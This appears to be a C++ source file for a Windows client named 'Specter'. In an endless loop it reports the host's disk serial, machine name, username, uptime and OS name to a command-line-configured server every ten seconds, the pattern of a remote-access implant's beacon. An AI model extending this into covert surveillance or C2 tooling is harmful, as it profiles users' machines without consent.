#include "SpecterInstance.h"

#include <iostream>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "SpecterLib/SystemInfo.h"
#include "SpecterLib/UserInfo.h"

SpecterInstance::SpecterInstance():
	m_initial_config(GetCommandLineW()),
	m_app_mutex(m_initial_config.GetInstanceGuid()),
	m_server_connection(m_initial_config.GetServerEndpoint(), m_initial_config.GetServerPort())
{
	TryToAttachConsole();
}

void SpecterInstance::TryToAttachConsole()
{
#ifdef _DEBUG
	if (!AttachConsole(ATTACH_PARENT_PROCESS))
	{
		return;
	}

	FILE* stream;
	freopen_s(&stream, "CONOUT$", "w", stderr);
	freopen_s(&stream, "CONOUT$", "w", stdout);
	freopen_s(&stream, "CONIN$", "r", stdin);

	std::cout << "Specter console-mode online" << std::endl;
#endif
}

void SpecterInstance::RunLoop()
{
	while (true)
	{
		m_server_connection.syncInfog(SystemInfo::GetHdSerial(), UserInfo::GetMachineName(),
		                              UserInfo::GetUsername(), SystemInfo::GetUptime(),
		                              SystemInfo::GetOsProductName());

		std::this_thread::sleep_for(std::chrono::seconds(10));
	}
}